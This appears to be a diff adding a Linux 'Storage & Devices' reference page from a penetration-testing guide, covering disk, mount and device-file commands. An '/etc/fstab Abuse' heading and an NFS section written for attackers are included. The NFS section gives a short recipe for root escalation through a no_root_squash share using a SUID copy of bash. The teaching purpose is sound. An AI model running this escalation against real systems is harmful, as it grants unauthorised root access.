@@ -1,0 +1,83 @@
+---
+title: "Storage & Devices"
+description: "Disks, partitions, mount points, and device files in Linux."
+---
+
+## Disks & Partitions
+
+```bash
+# List block devices
+lsblk
+fdisk -l
+
+# Disk usage
+df -h         # filesystem disk usage
+du -sh *      # directory sizes
+
+# Partition info
+cat /proc/partitions
+blkid         # device UUIDs and filesystem types
+```
+
+## Mount Points
+
+```bash
+# View current mounts
+mount
+cat /etc/fstab    # persistent mounts
+
+# Mount a device
+mount /dev/sdb1 /mnt/usb
+
+# Unmount
+umount /mnt/usb
+```
+
+### /etc/fstab Abuse
+
+If `/etc/fstab` is writable, you can add a mount that auto-executes on boot:
+
+```bash
+# Check writability
+ls -la /etc/fstab
+```
+
+## /dev — Device Files
+
+```bash
+# Block devices (disks)
+/dev/sda        # first disk
+/dev/sda1       # first partition
+/dev/nvme0n1    # NVMe disk
+
+# Special devices
+/dev/null       # discard output
+/dev/zero       # stream of null bytes
+/dev/random     # random data
+/dev/mem        # physical memory (dangerous)
+/dev/tty        # current terminal
+```
+
+## NFS (Network File System)
+
+NFS shares are a common misconfiguration vector.
+
+```bash
+# Enumerate NFS shares remotely
+showmount -e target.com
+
+# Mount a share
+mount -t nfs target.com:/share /mnt/nfs
+
+# no_root_squash misconfiguration
+# If enabled, files created as root locally are treated as root on the server
+# → Copy /bin/bash with SUID to the share
+cp /bin/bash /mnt/nfs/bash
+chmod +s /mnt/nfs/bash
+# On the target:
+/mnt/nfs/bash -p
+```
+
+<Warning>
+  NFS with `no_root_squash` is a critical misconfiguration that allows direct privilege escalation. Always check with `showmount` during enumeration.
+</Warning>
